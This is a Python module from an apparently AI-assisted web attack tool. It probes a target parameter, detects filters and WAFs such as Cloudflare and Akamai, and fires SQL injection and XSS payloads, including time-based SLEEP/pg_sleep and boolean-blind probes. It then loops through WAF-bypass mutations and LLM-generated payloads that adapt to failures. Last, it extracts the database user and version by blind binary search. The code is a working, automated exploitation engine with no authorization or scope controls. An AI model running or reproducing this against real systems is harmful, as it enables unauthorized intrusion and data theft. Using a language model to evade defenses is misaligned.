"""
XLayer AI - Adaptive Engine

Feedback loop: try payload → analyze failure → AI generates better payload → retry.
Integrates with AIPayloadGenerator and all hunters.
"""

import asyncio
from typing import List, Optional, Dict, Any, Callable, Awaitable
from dataclasses import dataclass, field
from loguru import logger

from xlayer_ai.llm.payload_generator import (
    AIPayloadGenerator, AttackContext, AttemptResult, BinarySearchExtractor,
    FailureReason,
)
from xlayer_ai.tools.payload_manager import PayloadManager
from xlayer_ai.tools.mutation_engine import MutationEngine
from xlayer_ai.models.target import Endpoint


# ─── Send Result ──────────────────────────────────────────────────────────────

@dataclass
class SendResult:
    """Unified result from sending a payload"""
    payload: str
    status_code: int
    body: str
    elapsed_ms: float
    success: bool
    error: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)


# ─── Probe Engine ─────────────────────────────────────────────────────────────

class ProbeEngine:
    """
    Smart target fingerprinting before main attack.
    Figures out what is filtered, what works, baseline measurements.
    """

    def __init__(self, send_fn: Callable):
        """send_fn: async(endpoint, param, payload) → SendResult"""
        self.send = send_fn

    async def probe(self, endpoint: Endpoint, parameter: str, ctx: AttackContext):
        """Run all probes and populate ctx with findings. Micro probe first."""
        logger.info(f"ProbeEngine: fingerprinting {endpoint.url}:{parameter}")

        # Probe-first: minimal probes (', <) → status, body snippet, WAF hint for payload choice
        try:
            from xlayer_ai.tools.probe_first import run_probe_first
            method = getattr(getattr(endpoint, "method", None), "value", None) or "GET"
            obs = await run_probe_first(
                url=endpoint.url,
                param=parameter,
                method=method if isinstance(method, str) else "GET",
                timeout=8.0,
            )
            ctx.probe_status_quote = obs.status_quote
            ctx.probe_status_lt = obs.status_lt
            ctx.probe_body_snippet = (obs.body_snippet or "")[:500]
            if obs.waf_hint and not ctx.waf:
                ctx.waf = obs.waf_hint
            logger.debug(f"ProbeEngine probe-first: quote={obs.status_quote} lt={obs.status_lt} waf={ctx.waf or 'none'}")
        except Exception as e:
            logger.debug(f"ProbeEngine probe-first failed: {e}")

        # Baseline must run first — other probes use ctx.baseline_length / baseline_time_ms
        await self._baseline(endpoint, parameter, ctx)

        # Run remaining probes in parallel — each writes to non-overlapping ctx fields
        results = await asyncio.gather(
            self._probe_chars(endpoint, parameter, ctx),
            self._probe_keywords(endpoint, parameter, ctx),
            self._probe_time(endpoint, parameter, ctx),
            self._probe_boolean(endpoint, parameter, ctx),
            self._detect_waf(endpoint, parameter, ctx),
            return_exceptions=True,
        )
        for i, r in enumerate(results):
            if isinstance(r, BaseException):
                logger.warning(f"ProbeEngine probe {i} failed: {r!r}")

        logger.info(
            f"ProbeEngine done: waf={ctx.waf} quotes_filtered={ctx.quotes_filtered} "
            f"time={ctx.time_delay_works} boolean={ctx.boolean_diff_works}"
        )

    async def _baseline(self, endpoint, param, ctx: AttackContext):
        r = await self.send(endpoint, param, "1")
        if r:
            ctx.baseline_length = len(r.body)
            ctx.baseline_time_ms = r.elapsed_ms
        else:
            ctx.baseline_length = 0
            ctx.baseline_time_ms = 0.0
            logger.warning("ProbeEngine baseline failed (timeout/error), using 0 for length/time")

    async def _probe_chars(self, endpoint, param, ctx: AttackContext):
        """Check which special chars are filtered"""
        chars_to_test = ["'", '"', "<", ">", "(", ")", ";", "--", "/*"]
        for char in chars_to_test:
            r = await self.send(endpoint, param, f"test{char}test")
            if r and char not in r.body:
                ctx.filtered_chars.append(char)
                if char in ("'", '"'):
                    ctx.quotes_filtered = True

    async def _probe_keywords(self, endpoint, param, ctx: AttackContext):
        """Check which SQL/XSS keywords are filtered"""
        keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "FROM",
                    "script", "alert", "onerror", "onload"]
        for kw in keywords:
            r = await self.send(endpoint, param, f"x{kw}x")
            if r and kw.lower() not in r.body.lower() and kw.upper() not in r.body:
                ctx.keywords_filtered.append(kw)

    async def _probe_time(self, endpoint, param, ctx: AttackContext):
        """Check if time-based injection is possible"""
        payloads = [
            "' AND SLEEP(3)--",
            "1 AND SLEEP(3)--",
            "'; SELECT pg_sleep(3)--",
        ]
        # Threshold: baseline + 2000ms (3s sleep minus generous margin)
        threshold_ms = ctx.baseline_time_ms + 2000.0
        for p in payloads:
            r = await self.send(endpoint, param, p)
            if r and r.elapsed_ms >= threshold_ms:
                ctx.time_delay_works = True
                break

    async def _probe_boolean(self, endpoint, param, ctx: AttackContext):
        """Check if boolean-blind injection is possible"""
        r_true = await self.send(endpoint, param, "1 AND 1=1")
        r_false = await self.send(endpoint, param, "1 AND 1=2")
        if r_true and r_false:
            diff = abs(len(r_true.body) - len(r_false.body))
            # Relative threshold: at least 5% of baseline or 30 bytes, whichever is larger
            threshold = max(30, int(ctx.baseline_length * 0.05))
            if diff > threshold:
                ctx.boolean_diff_works = True

    async def _detect_waf(self, endpoint, param, ctx: AttackContext):
        """Send a known bad payload to trigger WAF; check both body and headers."""
        r = await self.send(endpoint, param, "' OR 1=1 UNION SELECT NULL--")
        if not r:
            return

        # WAF detection even on non-blocking status (some WAFs silently alter responses)
        waf_body_sigs = {
            "Cloudflare":  ["cloudflare", "cf-ray"],
            "AWS WAF":     ["aws", "request blocked"],
            "Akamai":      ["akamai"],
            "Imperva":     ["incapsula", "x-iinfo"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Sucuri":      ["sucuri"],
        }
        # Header-based WAF fingerprints (header_name: [signatures])
        waf_header_sigs = {
            "Cloudflare":  {"cf-ray": None, "server": ["cloudflare"]},
            "AWS WAF":     {"x-amzn-requestid": None, "x-amz-cf-id": None},
            "Akamai":      {"server": ["akamaighost", "akamai"]},
            "Imperva":     {"x-iinfo": None},
            "Sucuri":      {"x-sucuri-id": None},
        }

        combined_body = r.body.lower()
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}

        detected = None

        # Check headers first (more reliable)
        for waf_name, header_rules in waf_header_sigs.items():
            for hdr, patterns in header_rules.items():
                if hdr in headers_lower:
                    if patterns is None or any(p in headers_lower[hdr] for p in patterns):
                        detected = waf_name
                        break
            if detected:
                break

        # Fallback: check body signatures (only on blocking status codes)
        if not detected and r.status_code in (403, 406, 429, 503):
            for waf_name, sigs in waf_body_sigs.items():
                if any(s in combined_body for s in sigs):
                    detected = waf_name
                    break
            if not detected:
                detected = "Generic WAF"

        if detected:
            ctx.waf = detected


# ─── Adaptive Engine ──────────────────────────────────────────────────────────

class AdaptiveEngine:
    """
    Main feedback loop engine.

    Phases:
      1. Static payloads (fast, no LLM cost)
      2. WAF bypass mutations (pattern-based)
      3. AI-generated payloads (LLM, learns from failures)
      4. Binary search extraction (if boolean confirmed)

    Stops when: success found OR max_ai_rounds exhausted (Phase 3)
    """

    def __init__(
        self,
        ai_generator: AIPayloadGenerator,
        payload_manager: PayloadManager,
        send_fn: Callable[[Endpoint, str, str], Awaitable[SendResult]],
        success_fn: Callable[[SendResult, AttackContext], bool],
        max_ai_rounds: int = 3
    ):
        self.ai = ai_generator
        self.payloads = payload_manager
        self.send = send_fn
        self.is_success = success_fn
        self.max_ai_rounds = max_ai_rounds
        self._mutation_engine = MutationEngine()

    async def run(
        self,
        endpoint: Endpoint,
        parameter: str,
        ctx: AttackContext,
        static_payloads: List[str],
        extra: Optional[Dict[str, Any]] = None
    ) -> List[AttemptResult]:
        """
        Run full adaptive attack loop.
        Returns list of ALL attempt results (successful and failed).
        """
        all_results: List[AttemptResult] = []

        # ── Phase 1: Probe target ────────────────────────────────────────────
        probe = ProbeEngine(self.send)
        await probe.probe(endpoint, parameter, ctx)

        # ── Phase 1: Static payloads ────────────────────────────────────────
        logger.info(f"AdaptiveEngine Phase 1 (Static): {len(static_payloads)} payloads")
        for payload in static_payloads:
            result = await self._try(endpoint, parameter, payload, ctx)
            all_results.append(result)
            ctx.add_attempt(result)
            if result.success:
                logger.success(f"Static payload worked: {payload[:50]}")
                return all_results

        # Apply WAF bypass mutations: static + failed payloads (failed payloads → mutation)
        vuln_type = ctx.vuln_type
        if ctx.waf or ctx.filtered_chars or ctx.keywords_filtered:
            logger.info(
                f"AdaptiveEngine Phase 2 (Mutations): MutationEngine ({ctx.waf or 'filter detected'}) "
                f"vuln={vuln_type}"
            )
            mutation_input = list(static_payloads[:5])
            failed = ctx.get_failed_payloads()
            if failed:
                mutation_input.extend(failed[-10:])  # last 10 failed, dedupe below
            seen = set()
            unique_input = []
            for p in mutation_input:
                if p not in seen:
                    seen.add(p)
                    unique_input.append(p)
            mutation_payloads = self._generate_waf_mutations(unique_input, ctx, vuln_type)
            for payload in mutation_payloads:
                result = await self._try(endpoint, parameter, payload, ctx)
                all_results.append(result)
                ctx.add_attempt(result)
                if result.success:
                    logger.success(f"WAF mutation worked: {payload[:50]}")
                    return all_results

        # ── Phase 3: AI-generated rounds ─────────────────────────────────────
        for ai_round in range(self.max_ai_rounds):
            logger.info(f"AdaptiveEngine Phase 3 (AI) Round {ai_round + 1}/{self.max_ai_rounds}")

            if not self.ai or not self.ai.llm or not self.ai.llm.is_ready:
                logger.warning("AdaptiveEngine: LLM not available, skipping AI rounds")
                break

            ai_payloads = await self.ai.generate(ctx, extra)
            if not ai_payloads:
                logger.warning("AI returned no payloads, stopping")
                break

            logger.info(f"AI generated {len(ai_payloads)} payloads")
            round_success = False

            for payload in ai_payloads:
                result = await self._try(endpoint, parameter, payload, ctx)
                all_results.append(result)
                ctx.add_attempt(result)
                if result.success:
                    logger.success(f"AI payload worked (round {ai_round+1}): {payload[:60]}")
                    round_success = True
                    break

            if round_success:
                return all_results

            # Phase 2b: after AI rounds, try mutating failed payloads once more
            if ai_round == self.max_ai_rounds - 1:
                failed_again = ctx.get_failed_payloads()
                if failed_again:
                    mutation_2b = self._generate_waf_mutations(failed_again[-8:], ctx, vuln_type)
                    for payload in mutation_2b:
                        result = await self._try(endpoint, parameter, payload, ctx)
                        all_results.append(result)
                        ctx.add_attempt(result)
                        if result.success:
                            logger.success(f"Phase 2b mutation worked: {payload[:50]}")
                            return all_results

            # Check if we're making progress
            recent = ctx.last_n_failures(3)
            if len(recent) == 3 and all(r.failure_reason == FailureReason.WAF_BLOCK for r in recent):
                logger.warning("AdaptiveEngine: All recent attempts WAF blocked, escalating bypass")
                ctx.keywords_filtered = list(set(
                    ctx.keywords_filtered + ["UNION", "SELECT", "OR", "AND"]
                ))

        # ── Phase 4: Binary search extraction (boolean-blind SQLi confirmed) ────
        if ctx.vuln_type == "sqli" and ctx.boolean_diff_works:
            logger.info("AdaptiveEngine Phase 4 (BinarySearch): boolean-blind confirmed")
            db = ctx.database if ctx.database not in ("unknown", "") else "mysql"
            extractor = BinarySearchExtractor(
                send_fn=self.send,
                endpoint=endpoint,
                parameter=parameter,
                ctx=ctx,
                db=db,
            )
            # Extract DB user and version as blind exploitation proof
            for label, expr in [
                ("db_user",    "SELECT user()"),
                ("db_version", "SELECT version()"),
            ]:
                try:
                    extracted = await extractor.extract_string(expr, max_length=40)
                    if extracted:
                        logger.success(f"BinarySearch extracted {label}='{extracted}'")
                        proof = AttemptResult(
                            payload=f"[BinarySearch:{label}]",
                            status_code=200,
                            response_body=extracted,
                            response_length=len(extracted),
                            elapsed_ms=0.0,
                            success=True,
                        )
                        all_results.append(proof)
                        ctx.add_attempt(proof)
                        return all_results
                except Exception as exc:
                    logger.debug(f"BinarySearch {label} error: {exc}")

        logger.info(
            f"AdaptiveEngine finished: {len(all_results)} attempts, "
            f"{sum(1 for r in all_results if r.success)} successes"
        )
        return all_results

    async def _try(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        ctx: AttackContext
    ) -> AttemptResult:
        """Send payload and classify result"""
        send_result = await self.send(endpoint, parameter, payload)

        if send_result is None:
            return AttemptResult(
                payload=payload, status_code=0, response_body="",
                response_length=0, elapsed_ms=0, success=False,
                failure_reason=FailureReason.TIMEOUT
            )

        success = self.is_success(send_result, ctx)
        failure_reason = self._classify_failure(send_result, payload, ctx) if not success else None
        filtered_chars = self._detect_filtered_chars(payload, send_result.body)
        waf_name = self._detect_waf_in_response(send_result)

        return AttemptResult(
            payload=payload,
            status_code=send_result.status_code,
            response_body=send_result.body[:500],
            response_length=len(send_result.body),
            elapsed_ms=send_result.elapsed_ms,
            success=success,
            failure_reason=failure_reason,
            filtered_chars=filtered_chars,
            waf_name=waf_name,
            error_message=send_result.error
        )

    def _classify_failure(self, r: SendResult, payload: str, ctx: AttackContext) -> FailureReason:
        if r.status_code in (403, 406, 429, 503):
            return FailureReason.WAF_BLOCK
        if r.status_code == 0:
            return FailureReason.TIMEOUT
        # Only use NO_DIFFERENCE when we have a valid baseline (avoids false positive when baseline failed)
        if ctx.baseline_length > 0 and abs(len(r.body) - ctx.baseline_length) < 10:
            return FailureReason.NO_DIFFERENCE
        payload_stripped = payload.replace("'", "").replace('"', "").replace("<", "").replace(">", "")
        if payload_stripped[:10].lower() not in r.body.lower():
            return FailureReason.FILTERED
        return FailureReason.UNKNOWN

    def _detect_filtered_chars(self, payload: str, body: str) -> List[str]:
        filtered = []
        for char in ["'", '"', "<", ">", "(", ")", ";", "--"]:
            if char in payload and char not in body:
                filtered.append(char)
        return filtered

    def _detect_waf_in_response(self, r: SendResult) -> Optional[str]:
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}

        # Header-based detection (reliable regardless of status code)
        header_sigs = {
            "Cloudflare": ["cf-ray", "server:cloudflare"],
            "AWS WAF":    ["x-amzn-requestid", "x-amz-cf-id"],
            "Akamai":     ["x-akamai-transformed"],
            "Imperva":    ["x-iinfo"],
            "Sucuri":     ["x-sucuri-id"],
        }
        for name, hdrs in header_sigs.items():
            for h in hdrs:
                if ":" in h:
                    hname, hval = h.split(":", 1)
                    if hname in headers_lower and hval in headers_lower[hname]:
                        return name
                elif h in headers_lower:
                    return name

        # Body-based detection (only on WAF-typical status codes)
        if r.status_code not in (403, 406, 429, 503):
            return None
        body = r.body.lower()
        body_sigs = {
            "Cloudflare": ["cloudflare"],
            "AWS WAF":    ["request blocked"],
            "Akamai":     ["akamai"],
            "Imperva":    ["incapsula"],
            "ModSecurity": ["mod_security"],
            "Sucuri":     ["sucuri"],
        }
        for name, patterns in body_sigs.items():
            if any(p in body for p in patterns):
                return name
        return "Generic WAF"

    def _generate_waf_mutations(
        self, payloads: List[str], ctx: AttackContext, vuln_type: str = "sqli"
    ) -> List[str]:
        """
        Generate WAF bypass mutations using the full MutationEngine.
        Returns priority-sorted, deduplicated payload strings.
        """
        return self._mutation_engine.mutate_to_strings(
            vuln_type=vuln_type,
            payloads=payloads,
            ctx=ctx,
            limit=40
        )
